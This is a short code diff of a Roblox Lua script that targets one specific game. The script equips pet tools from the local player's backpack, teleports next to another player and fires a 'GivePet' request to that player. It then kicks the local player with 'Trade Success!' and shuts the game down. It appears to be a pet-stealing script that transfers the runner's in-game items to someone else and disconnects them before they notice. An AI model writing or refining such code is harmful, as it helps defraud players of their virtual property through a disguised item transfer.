@@ -140,9 +140,10 @@ elseif target == 35789249 then
                                             if bp:FindFirstChild(toolequip) then
                                                 local tool = bp:FindFirstChild(toolequip)
                                                 if tool then
+                                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = x.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 6)
                                                     print("Equipping", tool)
                                                     chr.Humanoid:EquipTool(tool)
-                                                    task.wait(1)
+                                                    task.wait(2)
                                                     local args = {
                                                         "GivePet",
                                                         game:GetService("Players"):WaitForChild(x)
@@ -158,9 +159,9 @@ elseif target == 35789249 then
                                                 wait(3)
                                             end
                                         else
+                                            task.wait(2)
                                             print("Trade Success")
                                             player.LocalPlayer:Kick("Trade Success!")
-                                            wait(2)
                                             game:Shutdown()
                                         end
                                     end
@@ -184,6 +185,6 @@ elseif target == 35789249 then
         end
     end)
 else
-  print('not found scriptName!')
+    print('not found scriptName!')
 end
 
